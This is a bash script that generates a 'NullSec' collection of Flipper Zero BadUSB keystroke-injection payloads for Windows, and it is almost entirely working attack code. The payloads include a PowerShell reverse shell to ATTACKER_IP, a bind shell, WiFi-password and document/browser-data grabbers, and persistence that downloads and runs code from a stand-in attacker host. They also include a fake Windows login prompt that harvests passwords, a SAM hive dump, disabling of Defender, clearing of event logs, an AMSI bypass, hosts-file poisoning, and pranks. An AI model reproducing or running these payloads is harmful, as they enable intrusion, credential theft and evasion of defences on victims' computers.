#!/bin/bash

# NullSec BadUSB Payload Suite for Flipper Zero
# Creates a comprehensive collection of BadUSB payloads

PAYLOADS_DIR="/home/antics/nullsec/flipper-zero/apps/badusb"
mkdir -p "$PAYLOADS_DIR"/{recon,exfil,persistence,pranks,shells,creds,network,stealth}

echo "Creating NullSec BadUSB Payloads..."

# ============= RECON PAYLOADS =============

cat > "$PAYLOADS_DIR/recon/SystemRecon.txt" << 'EOF'
REM NullSec System Reconnaissance
REM Collects system info and saves to file

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $info = @()
ENTER
STRING $info += "=== NULLSEC SYSTEM RECON ==="
ENTER
STRING $info += "Hostname: $env:COMPUTERNAME"
ENTER
STRING $info += "User: $env:USERNAME"
ENTER
STRING $info += "Domain: $env:USERDOMAIN"
ENTER
STRING $info += "OS: $(Get-WmiObject Win32_OperatingSystem).Caption"
ENTER
STRING $info += "IP: $((Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ', ')"
ENTER
STRING $info += "MAC: $((Get-NetAdapter).MacAddress -join ', ')"
ENTER
STRING $info += "Installed Software:"
ENTER
STRING $info += (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName).DisplayName
ENTER
STRING $info | Out-File "$env:TEMP\recon.txt"
ENTER
STRING exit
ENTER
EOF

cat > "$PAYLOADS_DIR/recon/NetworkMap.txt" << 'EOF'
REM NullSec Network Mapper
REM Maps local network and identifies hosts

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress.Split('.')[0..2] -join '.'
ENTER
STRING $results = @()
ENTER
STRING 1..254 | ForEach-Object { $ip = "$subnet.$_"; if (Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1) { $results += $ip } }
ENTER
STRING $results | Out-File "$env:TEMP\network_map.txt"
ENTER
STRING exit
ENTER
EOF

cat > "$PAYLOADS_DIR/recon/WiFiProfiles.txt" << 'EOF'
REM NullSec WiFi Profile Extractor
REM Extracts saved WiFi passwords

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
ENTER
STRING $results = foreach ($p in $profiles) { $key = (netsh wlan show profile name="$p" key=clear | Select-String "Key Content").ToString().Split(':')[1].Trim(); "$p : $key" }
ENTER
STRING $results | Out-File "$env:TEMP\wifi_keys.txt"
ENTER
STRING exit
ENTER
EOF

# ============= SHELLS =============

cat > "$PAYLOADS_DIR/shells/ReverseShell.txt" << 'EOF'
REM NullSec Reverse Shell
REM Edit LHOST and LPORT before use

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $LHOST = "ATTACKER_IP"
ENTER
STRING $LPORT = "4444"
ENTER
STRING $client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT)
ENTER
STRING $stream = $client.GetStream()
ENTER
STRING [byte[]]$bytes = 0..65535|%{0}
ENTER
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
ENTER
STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
ENTER
STRING $sendback = (iex $data 2>&1 | Out-String )
ENTER
STRING $sendback2 = $sendback + "PS " + (pwd).Path + "> "
ENTER
STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
ENTER
STRING $stream.Write($sendbyte,0,$sendbyte.Length)
ENTER
STRING $stream.Flush()}
ENTER
STRING $client.Close()
ENTER
EOF

cat > "$PAYLOADS_DIR/shells/BindShell.txt" << 'EOF'
REM NullSec Bind Shell
REM Opens a listening shell on target

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $listener = [System.Net.Sockets.TcpListener]4444
ENTER
STRING $listener.start()
ENTER
STRING $client = $listener.AcceptTcpClient()
ENTER
STRING $stream = $client.GetStream()
ENTER
STRING [byte[]]$bytes = 0..65535|%{0}
ENTER
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
ENTER
STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
ENTER
STRING $sendback = (iex $data 2>&1 | Out-String )
ENTER
STRING $sendback2 = $sendback + "PS " + (pwd).Path + "> "
ENTER
STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
ENTER
STRING $stream.Write($sendbyte,0,$sendbyte.Length)
ENTER
STRING $stream.Flush()}
ENTER
EOF

# ============= EXFIL =============

cat > "$PAYLOADS_DIR/exfil/DocumentGrabber.txt" << 'EOF'
REM NullSec Document Grabber
REM Copies documents to attacker server

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $docs = Get-ChildItem -Path $env:USERPROFILE -Include *.doc,*.docx,*.pdf,*.xls,*.xlsx,*.txt -Recurse -ErrorAction SilentlyContinue | Select -First 50
ENTER
STRING $zip = "$env:TEMP\docs_$(Get-Date -Format 'yyyyMMdd').zip"
ENTER
STRING Compress-Archive -Path $docs.FullName -DestinationPath $zip -Force
ENTER
STRING # Upload to your server here
ENTER
STRING exit
ENTER
EOF

cat > "$PAYLOADS_DIR/exfil/BrowserData.txt" << 'EOF'
REM NullSec Browser Data Extractor
REM Extracts browser history and bookmarks

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
ENTER
STRING $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
ENTER
STRING $output = "$env:TEMP\browser_data"
ENTER
STRING New-Item -ItemType Directory -Path $output -Force
ENTER
STRING Copy-Item "$chrome\History" "$output\chrome_history" -ErrorAction SilentlyContinue
ENTER
STRING Copy-Item "$chrome\Bookmarks" "$output\chrome_bookmarks" -ErrorAction SilentlyContinue
ENTER
STRING Copy-Item "$edge\History" "$output\edge_history" -ErrorAction SilentlyContinue
ENTER
STRING Compress-Archive -Path $output -DestinationPath "$env:TEMP\browser.zip" -Force
ENTER
STRING exit
ENTER
EOF

# ============= PERSISTENCE =============

cat > "$PAYLOADS_DIR/persistence/RegistryPersist.txt" << 'EOF'
REM NullSec Registry Persistence
REM Adds persistence via registry run key

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $payload = "powershell -w hidden -c `"IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/payload.ps1')`""
ENTER
STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $payload
ENTER
STRING exit
ENTER
EOF

cat > "$PAYLOADS_DIR/persistence/ScheduledTask.txt" << 'EOF'
REM NullSec Scheduled Task Persistence
REM Creates hidden scheduled task

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c `"IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/payload.ps1')`""
ENTER
STRING $trigger = New-ScheduledTaskTrigger -AtLogOn
ENTER
STRING Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -Description "Windows Defender Update Service" -RunLevel Highest
ENTER
STRING exit
ENTER
EOF

# ============= NETWORK =============

cat > "$PAYLOADS_DIR/network/DNSPoison.txt" << 'EOF'
REM NullSec DNS Poisoner
REM Modifies hosts file

DELAY 1000
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c `"Add-Content C:\Windows\System32\drivers\etc\hosts \`\"ATTACKER_IP facebook.com\`\"; Add-Content C:\Windows\System32\drivers\etc\hosts \`\"ATTACKER_IP google.com\`\"`"'"
ENTER
EOF

cat > "$PAYLOADS_DIR/network/ProxySetup.txt" << 'EOF'
REM NullSec Proxy Configuration
REM Routes traffic through attacker proxy

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
ENTER
STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "ATTACKER_IP:8080"
ENTER
STRING exit
ENTER
EOF

# ============= CREDS =============

cat > "$PAYLOADS_DIR/creds/CredPhish.txt" << 'EOF'
REM NullSec Credential Phisher
REM Displays fake Windows login prompt

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING Add-Type -AssemblyName System.Windows.Forms
ENTER
STRING Add-Type -AssemblyName Microsoft.VisualBasic
ENTER
STRING $creds = [Microsoft.VisualBasic.Interaction]::InputBox("Windows Security`n`nYour session has expired. Please enter your password to continue.", "Windows Security - $env:USERNAME", "")
ENTER
STRING "$env:USERNAME : $creds" | Out-File "$env:TEMP\creds.txt"
ENTER
STRING exit
ENTER
EOF

cat > "$PAYLOADS_DIR/creds/SAMDump.txt" << 'EOF'
REM NullSec SAM Dumper
REM Extracts SAM database (requires admin)

DELAY 1000
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c `"reg save HKLM\SAM $env:TEMP\sam.save; reg save HKLM\SYSTEM $env:TEMP\system.save`"'"
ENTER
EOF

# ============= STEALTH =============

cat > "$PAYLOADS_DIR/stealth/DisableDefender.txt" << 'EOF'
REM NullSec Defender Disabler
REM Disables Windows Defender

DELAY 1000
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c `"Set-MpPreference -DisableRealtimeMonitoring \$true; Set-MpPreference -DisableBehaviorMonitoring \$true; Set-MpPreference -DisableIOAVProtection \$true`"'"
ENTER
EOF

cat > "$PAYLOADS_DIR/stealth/ClearLogs.txt" << 'EOF'
REM NullSec Log Clearer
REM Clears Windows event logs

DELAY 1000
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c `"wevtutil cl System; wevtutil cl Security; wevtutil cl Application; Clear-EventLog -LogName *`"'"
ENTER
EOF

cat > "$PAYLOADS_DIR/stealth/AMSIBypass.txt" << 'EOF'
REM NullSec AMSI Bypass
REM Bypasses AMSI for script execution

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
ENTER
STRING # AMSI Bypassed - execute payloads now
ENTER
EOF

# ============= PRANKS =============

cat > "$PAYLOADS_DIR/pranks/Wallpaper.txt" << 'EOF'
REM NullSec Wallpaper Changer
REM Changes desktop wallpaper

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $url = "https://raw.githubusercontent.com/bad-antics/nullsec-flipper-suite/main/assets/wallpaper.png"
ENTER
STRING $path = "$env:TEMP\nullsec.png"
ENTER
STRING Invoke-WebRequest -Uri $url -OutFile $path
ENTER
STRING Add-Type -TypeDefinition @"
ENTER
STRING using System.Runtime.InteropServices;
ENTER
STRING public class Wallpaper { [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }
ENTER
STRING "@
ENTER
STRING [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x01 -bor 0x02)
ENTER
STRING exit
ENTER
EOF

cat > "$PAYLOADS_DIR/pranks/FakeUpdate.txt" << 'EOF'
REM NullSec Fake Windows Update
REM Displays fake BSOD/update screen

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING Add-Type -AssemblyName System.Windows.Forms
ENTER
STRING $form = New-Object System.Windows.Forms.Form
ENTER
STRING $form.BackColor = [System.Drawing.Color]::FromArgb(0,120,215)
ENTER
STRING $form.FormBorderStyle = 'None'
ENTER
STRING $form.WindowState = 'Maximized'
ENTER
STRING $form.TopMost = $true
ENTER
STRING $label = New-Object System.Windows.Forms.Label
ENTER
STRING $label.Text = "Working on updates`n`n42% complete`n`nDon't turn off your PC"
ENTER
STRING $label.ForeColor = 'White'
ENTER
STRING $label.Font = New-Object System.Drawing.Font("Segoe UI",24)
ENTER
STRING $label.AutoSize = $true
ENTER
STRING $label.Location = New-Object System.Drawing.Point(400,300)
ENTER
STRING $form.Controls.Add($label)
ENTER
STRING $form.ShowDialog()
ENTER
EOF

cat > "$PAYLOADS_DIR/pranks/VoiceMessage.txt" << 'EOF'
REM NullSec Voice Message
REM Speaks a message through speakers

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 500

STRING Add-Type -AssemblyName System.Speech
ENTER
STRING $voice = New-Object System.Speech.Synthesis.SpeechSynthesizer
ENTER
STRING $voice.Rate = 0
ENTER
STRING $voice.Speak("You have been pwned by NullSec. Have a nice day.")
ENTER
STRING exit
ENTER
EOF

echo ""
echo "╔═══════════════════════════════════════════════╗"
echo "║     NullSec BadUSB Payloads Created!          ║"
echo "╚═══════════════════════════════════════════════╝"
echo ""
find "$PAYLOADS_DIR" -name "*.txt" -type f | wc -l
echo " payloads created in:"
echo ""
ls -la "$PAYLOADS_DIR"
